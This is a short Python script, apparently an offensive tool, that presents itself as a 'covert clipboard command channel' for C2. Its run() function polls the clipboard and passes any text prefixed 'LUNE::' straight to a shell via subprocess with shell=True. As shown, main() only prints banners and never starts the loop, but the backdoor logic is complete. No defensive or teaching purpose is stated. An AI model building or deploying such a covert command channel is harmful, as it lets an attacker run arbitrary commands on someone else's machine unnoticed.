import time
import re
import subprocess
import pyperclip
from rich import print
from rich.panel import Panel

SIGNATURE = "LUNE::"

def parse_clipboard():
    try:
        content = pyperclip.paste()
        if content.startswith(SIGNATURE):
            cmd = content[len(SIGNATURE):].strip()
            return cmd
    except Exception as e:
        print(f"[red]Clipboard access error:[/red] {e}")
    return None

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
        print(f"[bold green]$ {cmd}[/bold green]\n[dim]{output.decode().strip()}[/dim]\n")
    except Exception as e:
        print(f"[yellow]Command failed:[/yellow] {e}")

def run():
    print(Panel("📋 [bold magenta]FLICKER — Covert Clipboard Command Channel[/bold magenta]"))
    print("[cyan]Listening for clipboard signals...[/cyan]\n")

    try:
        while True:
            signal = parse_clipboard()
            if signal:
                run_command(signal)
                time.sleep(2)  # avoid hammering
            time.sleep(0.75)
    except KeyboardInterrupt:
        print("\n[red]Stopped listening.[/red]")

def main(args=None):
    print("[flicker] Covert clipboard channel initialized.")
    print("[flicker] Listening for C2 signals...")

if __name__ == "__main__":
    main()
